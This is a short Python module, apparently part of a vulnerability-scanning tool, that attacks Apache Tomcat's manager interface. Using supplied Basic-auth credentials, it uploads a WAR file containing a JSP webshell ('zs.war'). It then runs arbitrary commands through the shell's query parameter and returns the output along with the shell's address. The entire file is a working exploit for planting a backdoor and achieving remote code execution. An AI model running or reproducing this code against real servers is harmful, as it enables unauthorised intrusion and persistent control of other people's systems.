import re

import requests

from VulnScanModel.models import VulnScan
from .. import requestUtil, fileUtil



def upload_war(url, authorized_key):
    resp = requestUtil.get(url+"/manager/html", header={"Authorization": "Basic %s" % authorized_key})
    upload_path = re.findall(r'"(/manager/html/upload.*?)"', resp.text)[0]
    data = requestUtil.get_file_data(filename="zs.war", filedata=fileUtil.open_file(filename="zs.war", dir="webshell", mode="rb").read(), param="deployWar")
    resp = requestUtil.post(url+upload_path, data=data[0], header={"Content-Type": data[1],"Authorization": "Basic %s" % authorized_key})
    return True

def rce(url, cmd):
    resp = requestUtil.get(url+f"/zs/zs.jsp?i={cmd}")
    print(resp.text)
    if resp.status_code != 404:
        return re.findall(b"<pre>(.*?)</pre>", resp.content.replace(b'\x00', b''), re.DOTALL)[0].decode()
    else:
        return False

def exp(vuln: VulnScan, cmd, content=""):
    result = rce(vuln.url, cmd)
    if not result:
        upload_war(vuln.url, vuln.specify)
        result = rce(vuln.url, cmd)
    return "shell地址: \n%s" % f"{vuln.url}/zs/zs.jsp\n输出结果:\n" + str(result)